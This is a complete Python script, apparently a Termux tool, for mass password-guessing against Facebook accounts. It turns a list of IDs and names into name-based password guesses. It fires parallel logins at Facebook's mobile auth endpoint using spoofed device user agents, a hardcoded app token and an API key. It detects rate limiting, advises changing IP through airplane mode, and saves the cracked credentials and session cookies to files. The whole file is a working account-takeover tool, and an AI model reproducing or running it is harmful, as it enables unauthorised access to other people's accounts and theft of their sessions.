#!/usr/bin/python
#Original written By Mogid Khan
#MKT(Mogid Khan Termux) Brand

#Feel MKT POWER

import os,sys, requests, random, string,uuid,time,re,json
from concurrent.futures import ThreadPoolExecutor as TPE

Devices=requests.get("https://raw.githubusercontent.com/Makino/MAKIE/main/Devices.txt").text.splitlines()

class Generate:
  def __init__(self):
    self.devices=requests.get("https://raw.githubusercontent.com/mogid458/MKT/main/Devices.txt").text.splitlines()
    self.networks = ["Telenor", "UFONE-PAKTel", "Zong", "Jazz", "SCO", "Jio", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Banglalink", "Teletalk", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange"]
  
  def password(self,Name,passwords):
    password_list=[]
    
    splitted=Name.split()
    First=splitted[0]
    try:
      Last=splitted[-1]
    except:
      Last=First
    FIRST, LAST = First.upper(), Last.upper()
    first,last=First.lower(), Last.lower()
    name = Name.lower()
    NAME = Name.upper()
    
    for cpassword in passwords:
      cpassword=cpassword.replace("first", first).replace("last", last).replace("First", First).replace("Last", Last).replace("FIRST", FIRST).replace("LAST", LAST).replace("name", name).replace("Name", Name).replace("NAME", NAME)
      password_list.append(cpassword)
    
    return password_list
  
  def FBAN_UA(self):
    android_version=random.randint(5,15)
    device=random.choice(self.devices)
    FBAV=f"{random.randint(180,500)}.0.0.{random.randint(1,999)}.{random.randint(1,999)}"
    FBBV=random.randint(100000000,999999999)
    FBCR=random.choice(self.networks)
    ua=f"[FBAN/FB4A;FBAV/{FBAV};FBBV/{FBBV};FBDM/"+"{density=2.5,width=1440,height=980}"+f";FBLC/fr_FR;FBRV/0;FBCR/{FBCR};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_version};FBOP/5;FBCA/x64:arm-v8a;]"
    return ua

class Colors:
  def __init__(self):
    self.dark_green="\x1B[1;32m"
    self.light_green="\x1B[1;92m"
    self.dark_red="\x1B[1;31m"
    self.light_red="\x1B[1;91m"
    self.dark_blue="\x1B[1;34m"
    self.light_blue="\x1B[1;94m"
    self.dark_cyan="\x1B[1;36m"
    self.light_cyan="\x1B[1;96m"
    self.reset="\x1B[0;1m"
    
class Login:
  def __init__(self):
    self.color=Colors()
    self.loop=0
    self.ok=0
    self.cp=0 
    self.ip=self.color.light_green
    self.percent=0
    self.total=0
    self.Generate=Generate()
    
  def check_ip(self, response):
    if "Calls to this api have" in response or "The action attempted has been" in response:
      self.ip=self.color.light_red
      #sys.exit()
    else:
      self.ip=self.color.light_green
  
  def show_id(self,status,user_id,password,color,cookies=""):
    print(f" {color[0]}({status}) {color[1]}{user_id} - {password}{self.color.reset}")
    if cookies!="":print(f" {self.color.dark_blue}Cookie {self.color.dark_cyan}> {self.color.light_blue}{cookies}{self.color.reset}") 
    else:pass
  
  def save_id(self,status,user_id,password,cookies=""):
    open(f"/sdcard/MAKIE_FILE_{status}.txt","a").write(f"{user_id}|{password}{'|'+cookies if cookies!='' else ''}\n")
  
  def crack_complete(self):
    print(f"""
 {self.color.dark_blue}Crack Completed{self.color.reset}
 {self.color.light_blue}OK > {self.ok}
 {self.color.light_blue}CP > {self.cp}{self.color.reset}
    """)
  
  def b_graph(self,user_id,passwords):
    try:
      print(f" ({self.color.light_blue}MAKIE {self.ip}•{self.color.reset} {self.color.light_blue}{self.loop}{self.color.reset}) {self.color.light_green}{self.ok}{self.color.reset}-{self.color.light_red}{self.cp}{self.color.reset}{self.color.reset}",end="\r")
      #sys.stdout.flush()
      session=requests.Session()
      
      for password in passwords:
        adid=str(uuid.uuid4())
        did=str(uuid.uuid4())
        data={
          "adid": adid,
          "format": "json",
          "device_id": did,
          "cpl": "true",
          "family_device_id": did,
          "credentials_type": "device_based_login_password",
          "error_detail_type": "button_with_disabled",
          "source": "device_based_login",
          "email": user_id,
          "password": password,
          "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
          "generate_session_cookies": "1",
          "meta_inf_fbmeta": "",
          "advertiser_id": str(uuid.uuid4()),
          "currently_logged_in_userid": "0",
          "locale": "fr_FR",
          "client_country_code": "FR",
          "method": "auth.login",
          "fb_api_req_friendly_name": "authenticate",
          "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
          "api_key": "882a8490361da98702bf97a021ddc14d"
        }
        header={
          'User-Agent':self.Generate.FBAN_UA(),
          'Content-Type': 'application/x-www-form-urlencoded',
          'Host': 'b-graph.facebook.com',
          'X-FB-Net-HNI': str(random.randint(20000, 50000)),
          'X-FB-SIM-HNI': str(random.randint(20000, 50000)),
          'X-FB-Connection-Type': 'MOBILE.LTE',
          'X-Tigon-Is-Retry': 'False',
          'x-fb-session-id': 'nid=jiZ_yNNBgbwC;pid=Main;tid=145;nc=1;fc=5;bc=0;cid=d29d67e37eca387482a8a5b740f86e62',
          'x-fb-device-group': '1930',
          'X-FB-Friendly-Name': 'authenticate',
          'X-FB-Request-Analytics-Tags': 'graphservice',
          'X-FB-HTTP-Engine': 'Liger',
          'X-FB-Client-IP': 'True',
          'X-FB-Server-Cluster': 'True',
          'x-fb-connection-token': 'd29d67e37eca387482a8a5b740f86e62'
        }
        url="https://b-graph.facebook.com/auth/login"
        session.headers.update(header)
        response=session.post(url,data=data).text
        self.check_ip(response)
        #print(response)
        if "session_key" in response:
          self.ok+=1
          jr=json.loads(response)
          c1=";".join(i["name"]+"="+i["value"] for i in jr["session_cookies"])
          cookies=f"sb={''.join(random.choices(string.ascii_letters+string.digits,k=24))};{c1}"
          self.show_id("OK",user_id,password,[self.color.dark_green,self.color.light_green],cookies)
          self.save_id("OK",user_id,password,cookies)
          break
          
        elif "User must verify their account" in response or "Login approval" in response or "Two factor" in response:
          self.cp+=1
          self.show_id("CP",user_id,password,[self.color.dark_red,self.color.light_red])
          self.save_id("CP",user_id,password)
          break
        else:continue
      self.loop+=1
    except requests.exceptions.ConnectionError:
      time.sleep(10)
      self.b_graph(user_id,passwords)
    except Exception as error:
      pass
  
class Menu:
  def __init__(self):
    self.color=Colors()
    self.Generate=Generate()
    self.Login=Login()
    self.logo=f"""{self.color.light_blue}
 
███╗   ███╗ █████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗ 
████╗ ████║██╔══██╗██║ ██╔╝██║████╗  ██║██╔═══██╗
██╔████╔██║███████║█████╔╝ ██║██╔██╗ ██║██║   ██║
██║╚██╔╝██║██╔══██║██╔═██╗ ██║██║╚██╗██║██║   ██║
██║ ╚═╝ ██║██║  ██║██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                                                        
 © {self.color.light_cyan} Makino Giovanni
 tool status > {self.color.light_green}Private{self.color.light_cyan}
 Version > {self.color.light_green}0.1{self.color.reset}\n"""
    self.file_path=""
    self.user_ids_passwords=[]
    
  def clear(self):
    os.system("clear")
    print(self.logo)
  
  def main(self):
    #Screen 1
    self.clear()
    try:
      self.file_path=input(f"{self.color.dark_blue} (?) File Path > {self.color.reset}")
      self.user_ids_passwords=open(self.file_path,"r").read().splitlines()
    except:
      print(f" ($) {self.color.dark_red} File not found {self.color.reset}")
      sys.exit()
    
    #Screen 2
    self.clear()
    print(f"""
 {self.color.dark_cyan}Indentifiers > {self.color.reset}
   First  Last > Default Names
   first  last > Names in small letter
   FIRST  LAST > Names in capital letter 
   Name > Default Full Name
   name > Full name in small letters
   NAME > Full name in capital letters
   
 {self.color.dark_cyan}Example > {self.color.reset}
  (1) first123 = first name in small letter+ 123
  (2) Name123 = Name + 123
    """)
    input(f" {self.color.dark_blue}(?) Continue > {self.color.reset}")
    
    #Screen 3
    self.clear()
    try:total_passwords=int(input(f" {self.color.dark_blue}(?) Total Passwords > {self.color.reset}"))
    except:total_passwords=2
    
    passwords=[]
    for i in range(total_passwords):
      password=input(f'  {self.color.light_cyan}(*) Password {i+1} > {self.color.reset}')
      passwords.append(password)
   
    #Screen 4
    self.clear()
    
    print(f""" {self.color.light_green}Cracking Started
 {self.color.dark_cyan}Total id > {self.color.light_green}{len(self.user_ids_passwords)}{self.color.reset}
 {self.color.dark_cyan}Switch Aeroplane mode after every few minutes{self.color.reset}\n\n""")
    with TPE(max_workers=25) as tp:
      for user_id_password in self.user_ids_passwords:
        try:
          user_id,Name=user_id_password.split("|")
          user_id,Name=user_id.strip(),Name.strip()
          crack_passwords=self.Generate.password(Name,passwords)
          tp.submit(self.Login.b_graph,user_id,crack_passwords)
        except Exception as error:
          print(error)
    
    self.Login.crack_complete()
    input(f" {self.color.dark_blue}(?) Continue > {self.color.reset}")
    
Menu().main()
